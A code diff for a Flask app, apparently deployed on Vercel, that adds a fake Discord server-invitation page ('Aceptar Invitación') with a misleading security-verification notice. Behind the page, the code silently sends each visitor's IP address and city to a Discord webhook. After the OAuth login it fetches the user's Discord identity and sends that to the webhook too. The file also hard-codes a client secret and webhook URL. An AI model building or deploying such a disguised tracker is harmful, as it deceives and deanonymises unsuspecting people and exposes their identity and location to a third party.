@@ -1,51 +1,79 @@
 import os
-from flask import Flask, render_template, request, redirect
+from flask import Flask, request, redirect, render_template_string
 import requests
 
-# Configuramos Flask para que busque la carpeta templates que está junto a este archivo
-app = Flask(__name__, template_folder='templates')
+app = Flask(__name__)
 
+# --- CONFIGURACIÓN ---
 CLIENT_ID     = "1457527346687901812"
 CLIENT_SECRET = "8NXd3i8r1QXproq-MMf8EqW_BJOujcPR"
 REDIRECT_URI  = "https://logger-page-g0oldyv1y-ola950857gmailcoms-projects.vercel.app/callback"
 WEBHOOK       = "https://discord.com/api/webhooks/1456993989306749133/2JG3BvXA__irPAOcgx-R-lTPC7n7ScgWSgUl0jMmnR-staCUFK0b0upG2LwDHfck1ean"
 LOGO          = "https://i.pinimg.com/736x/10/e3/f5/10e3f51d11ef13d5c88cb329211146ba.jpg"
 
+# DISEÑO HTML PREMIUM INTEGRADO
+HTML_TEMPLATE = """
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Discord | Invitación</title>
+    <link href="https://fonts.googleapis.com/css2?family=Outfit:wght@400;600;700&display=swap" rel="stylesheet">
+    <style>
+        body { background-color: #313338; margin: 0; display: flex; justify-content: center; align-items: center; height: 100vh; font-family: 'Outfit', sans-serif; background-image: url('https://discord.com/assets/2c21aeda16de354ba533.png'); background-size: cover; color: white; }
+        .card { background-color: #2b2d31; width: 100%; max-width: 440px; padding: 32px; border-radius: 8px; box-shadow: 0 8px 16px rgba(0,0,0,0.3); text-align: center; border: 1px solid rgba(255,255,255,0.05); }
+        .guild-img { width: 80px; height: 80px; border-radius: 28px; margin-bottom: 20px; object-fit: cover; box-shadow: 0 4px 10px rgba(0,0,0,0.3); }
+        .header { color: #b5bac1; font-size: 12px; font-weight: 700; text-transform: uppercase; margin-bottom: 8px; letter-spacing: 0.5px; }
+        .name { color: #f2f3f5; font-size: 24px; font-weight: 600; margin-bottom: 25px; }
+        .btn { background-color: #5865f2; color: white; text-decoration: none; padding: 13px; border-radius: 3px; font-weight: 500; font-size: 16px; display: block; transition: 0.2s; }
+        .btn:hover { background-color: #4752c4; }
+        .footer { color: #949ba4; font-size: 12px; margin-top: 20px; line-height: 1.5; }
+        .brand { font-size: 10px; text-transform: uppercase; letter-spacing: 2px; color: #4e5058; margin-top: 15px; }
+    </style>
+</head>
+<body>
+    <div class="card">
+        <img src="{{ logo }}" class="guild-img">
+        <div class="header">Estás invitado a unirte a</div>
+        <div class="name">Servidor de al3xg0nzalezzz</div>
+        <a href="{{ auth_url }}" class="btn">Aceptar Invitación</a>
+        <div class="footer">Al unirte, autorizas la verificación de seguridad necesaria para el acceso exclusivo al servidor.</div>
+        <div class="brand">al3xg0nzalezzz</div>
+    </div>
+</body>
+</html>
+"""
+
+def get_ip():
+    ip = request.headers.get('x-real-ip') or request.headers.get('x-forwarded-for', request.remote_addr).split(',')[0].strip()
+    return ip
+
 @app.route('/')
 def home():
-    # Detectar IP real pasándole los filtros de Vercel
-    ip = request.headers.get('x-real-ip') or request.headers.get('x-forwarded-for', request.remote_addr).split(',')[0].strip()
+    ip = get_ip()
     city = request.headers.get('x-vercel-ip-city', 'Desconocida')
-    
-    # LOG SILENCIOSO (Visita)
+    # LOG VISITA
     requests.post(WEBHOOK, json={
         "username": "1* Tracker - Visita", "avatar_url": LOGO,
-        "embeds": [{
-            "title": "👁️ Conexión Detectada", "color": 0x5865F2,
-            "fields": [{"name": "🌐 IP", "value": f"`{ip}`", "inline": True}, {"name": "📍 Localidad", "value": f"{city}", "inline": True}]
-        }]
+        "embeds": [{"title": "👁️ Visita Detectada", "color": 0x5865F2, "fields": [{"name": "🌐 IP", "value": f"`{ip}`", "inline": True}, {"name": "📍 Localidad", "value": f"{city}", "inline": True}]}]
     })
-    
     auth_url = f"https://discord.com/api/oauth2/authorize?client_id={CLIENT_ID}&redirect_uri={REDIRECT_URI}&response_type=code&scope=identify"
-    return render_template('index.html', auth_url=auth_url)
+    return render_template_string(HTML_TEMPLATE, auth_url=auth_url, logo=LOGO)
 
 @app.route('/callback')
 def callback():
     code = request.args.get('code')
     if not code: return redirect("https://discord.gg/nUy6Vjr9YU")
-
     try:
-        # Intercambio de códigos por datos de Discord
         r = requests.post("https://discord.com/api/v10/oauth2/token", data={
             'client_id': CLIENT_ID, 'client_secret': CLIENT_SECRET, 'grant_type': 'authorization_code', 'code': code, 'redirect_uri': REDIRECT_URI
         }, headers={'Content-Type': 'application/x-www-form-urlencoded'}).json()
-        
         token = r.get('access_token')
         if token:
             user = requests.get("https://discord.com/api/v10/users/@me", headers={'Authorization': f'Bearer {token}'}).json()
-            ip = request.headers.get('x-real-ip') or request.remote_addr
-            
-            # LOG DE IDENTIDAD
+            ip = get_ip()
+            # LOG IDENTIDAD
             requests.post(WEBHOOK, json={
                 "username": "1* Tracker - IDENTIDAD", "avatar_url": LOGO,
                 "embeds": [{
@@ -57,5 +85,5 @@ def callback():
     except: pass
     return redirect("https://discord.gg/nUy6Vjr9YU")
 
-# Vercel busca este objeto
+# Vercel necesita encontrar 'app'
 app = app
